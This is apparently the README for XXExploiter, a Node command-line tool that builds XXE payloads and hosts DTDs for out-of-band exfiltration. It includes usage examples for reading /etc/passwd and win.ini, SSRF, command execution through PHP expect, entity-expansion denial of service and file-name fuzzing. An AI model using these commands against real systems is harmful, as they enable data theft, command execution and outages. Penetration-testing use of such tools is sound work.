# XXExploiter  
  
![Build](https://github.com/luisfontes19/xxexploiter/workflows/Build/badge.svg)
[![codecov](https://codecov.io/gh/luisfontes19/xxexploiter/branch/master/graph/badge.svg)](https://codecov.io/gh/luisfontes19/xxexploiter)
[![Known Vulnerabilities](https://snyk.io/test/github/luisfontes19/xxexploiter/badge.svg?targetFile=package.json)](https://snyk.io/test/github/luisfontes19/xxexploiter?targetFile=package.json)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

![XXExploiter](banner.png?raw=true)


It generates the XML payloads, and automatically starts a server to serve the needed DTD's or to do data exfiltration.   

## Installation  
  
```
#install node and npm if you don't have it yet 
npm install -g xxexploiter
```
  
## Building & Running  from source
This is a simple Node application written with typescript. So you can build it as you build other apps:  
(install node and npm first, if you dont have them)  
```  
npm install  
npm run build  
#you may need to npm install typescript -g in order for 'npm build' to succeed 
```  
  
To run the app you can do it with one of 3 ways:  
  
```  
npm start [args]  
node dist/index.js [args]  
npm link #and now just call xxexploiter
```  

Or you can install it on your system:

```
npm link
```
  
## Usage  
  
```  
Usage: xxexploiter.ts [command] [options]

Commands:
  xxexploiter file [file_to_read]  Use XXE to read a file
  xxexploiter request [URL]        Use XXE to do a request
  xxexploiter expect [command]     Use XXE to execute a command through PHP's expect
  xxexploiter xee [expantions]     Generate a huge content by resolving entities

Fuzzing Specific Options
  -f, --fuzz            Enables fuzz options. Use {{FUZZ}} placeholder in the command arg for the magic.
  -w, --wordlist        Path to a wordlist to be used with the fuzz command
  -y, --success-string  String to search for a success response in the requests
  -n, --error-string    String to search for an error response in the request

Options:
  --version             Show version number                                                                                                            [boolean]
  -s, --server          Server address for OOB and DTD
  -p, --port            Server port for OOB and DTDs. Default: 7777
  -t, --template        path to an XML template where to inject payload
  -m, --mode            Extraction Mode: xml, oob, cdata. Default: xml
  -e, --encode          Extraction Encoding: none, phpbase64. Default: none
  -o, --output          Output for the XML payload file. Default is to console
  -x                    Use a request to automatically send the xml file
  -X, --request-output  Output the response from -x option. If not defined goes to stdout
  -h, --help            Show help                                                                                                                      [boolean]

Examples:
  cli.ts expect ls
  cli.ts -s 127.0.0.1 expect ls -e phpbase64 -m oob -o output.xml
  cli.ts -s 127.0.0.1 file /c/windows/win.ini -t xmltemplate.xml -m oob
  cli.ts xee 900000000 -o output.xml
  cli.ts file /etc/passwd -x request.txt -t template.xml
  cli.ts file /root/{FUZZ} -f -w wordlist.txt -n "not found" -x request.txt

Extra Info:
  - When using the xml or cdata modes, add the placeholder '{{XXE}}' in the field where you want the entity content to be injected
  - When specifiying file paths for windows use forward slash.
  - OOB: Out Of Bound: You can use this option to send the data processed by the xml parser, to your local webserver. Usefull with blind attacks
  - When using XML mode, it may break the XML parsing if XML reserved characters are loaded, so you may want to use cdata
  - When using the request option, you can specify the placeholder to inject the payload with {{XXE}} or {{XXE_B64}}
  - When doing fuzz you need to supply a wordlist. You can add the {{FUZZ}} keyword in the main command argument.
  - You can specify a string to filter successfull requests when fuzzing, either by supplying an expected error string, or an expected success string
```  
  
There are basically 4 main commands:  
* **file** - to read local files  
* **request** - do SSRF attack, to make requests from the target machine  
* **expect** - Use PHP expect to execute commands, if your target is a PHP app  
* **XEE** - Just do parameter expansions to try to cause a DOS.  
   
## Some notes:  
  
If you choose to use OOB or CDATA mode, XXExploiter will generate the necessary dtd to be included, and will start a server to host them. Have in mind that if you use these options you should set the server address  
  
If you include content in the body of the XML have in mind that XML restricted characters like '<' may break the parsing so be sure to use CDATA or PHP's base64encode  
  
Most of languages limit the number of entity expantions, or the total length of the content expanded, so make sure you test XEE on your machine first, with the same conditions as the target  
  
## Template  
Sometimes we need to send XML with specific fields to be able to exploit a vulnerability. So in order to help, I've introduced the -t (--template) option.   

You can create a regular XML file to be used to generate the malicious payload.  
If you want to add the content of a request or a file read in the content of this file, you can place the placeholder {{XXE}} where you want that to be.  

There may be some limitations right now with this option, if you send an XML template with a DOCTYPE field.  
  
## Request   
After all this automation it would be boring to have to manually send the XML file to the server right?  
Yeah, so I created a really nice option (-x) to automatically do it for you.  

You can use a request that you grab for example from Burp, and use it here. (Note that the -x options wants a file)  
Also have in mind that relative paths in the request may not work properly. By default if that happens xxexploiter tries to get the url from Host header.
But will always do a http connection (no https). SO if you grab the request from burp be sure you add the full request :)

In the place where you want the XML content to be injected you can add the placeholder {{XXE}} or if you need it encoded in b64 (yeah, i needed it once) use {{XXE_B64}}  
  
## Fuzzer 
Found a vulnerable server and you want to extract files but don't know which files?  
You can use fuzz with your XXE to try to find files based on wordlists for file names.
Just use the placeholder {{FUZZ}} in the argument of the commend you're using. Combine it with -x to automate the requests  
And flter responses from the server with -y and -n specifying expected strings in response if a file is found (-y), or expected string if not found (-n)  
If you want to filter by status code thats also possible since xxexploiter will search in the entire response. you can do something like: -y 'HTTP/1.1 200 OK
'
  
